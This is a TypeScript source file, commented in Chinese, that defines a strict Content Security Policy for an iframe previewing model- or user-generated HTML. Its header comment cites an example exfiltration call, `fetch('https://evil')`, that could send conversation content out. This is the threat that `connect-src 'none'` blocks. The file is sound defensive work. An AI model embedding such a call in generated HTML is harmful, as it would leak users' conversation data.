/**
 * 产物预览 iframe 的内容安全策略（FR-8.12）。
 *
 * ## 抄的是什么
 *
 * WorkBuddy 的 `markdown-shared-guest.html` 对不可控 HTML 产物套了严格 CSP；
 * 本项目原先的 `ArtifactRenderer.tsx` / `WebTabView.tsx` 用 `srcDoc` 渲染模型/
 * 用户生成的 HTML，却**没有任何 CSP**——产物里的 `fetch('https://evil')` 能
 * 直接把对话内容外传。
 *
 * ## 为什么是这套值
 *
 * 威胁面是「产物 HTML 外传数据」，唯一的出网通道是 `connect-src`
 * （fetch / XMLHttpRequest / WebSocket / EventSource）。所以**硬性要求**
 * `connect-src 'none'`——这是 FR-8.12 的不可妥协项，去掉它用例即红。
 *
 * 其余指令在「默认严」与「产物能渲染出来」之间折中：
 * - `script-src 'unsafe-inline'`：产物多为单文件自包含 HTML，内联脚本要能跑；
 *   不给 `https:` —— 外部脚本不是产物业态，且能被 connect 之外的方式利用。
 * - `style-src` / `img-src` / `font-src` / `media-src` 放开 `https:`：
 *   这些只是「拉资源进来」，不构成外传通道；放开避免把依赖外链 CSS/字体的
 *   产物渲染成白板（见风险登记 R-12）。
 * - `frame-ancestors 'none'` / `child-src 'none'`：产物再嵌套 iframe 也走最严。
 *
 * 注意：**真机浏览标签页（WebTabView 的 url 模式）不套这套 CSP**——那是用户主动
 * 访问的外部网址，套 `connect-src 'none'` 会直接打不开网页。只有「文档/快照预览」
 * （docMode）才套，因为是模型/Agent 生成、不可控的内容。
 */

/** 产物预览 iframe 的 CSP 字符串（挂在 `<iframe csp={...}>` 上） */
export const ARTIFACT_PREVIEW_CSP = [
  "default-src 'none'",
  "script-src 'unsafe-inline'",
  "style-src 'unsafe-inline' https:",
  "img-src 'self' data: blob: https:",
  "font-src 'self' data: https:",
  "media-src 'self' data: blob: https:",
  "connect-src 'none'",
  "frame-ancestors 'none'",
  "child-src 'none'",
].join('; ');
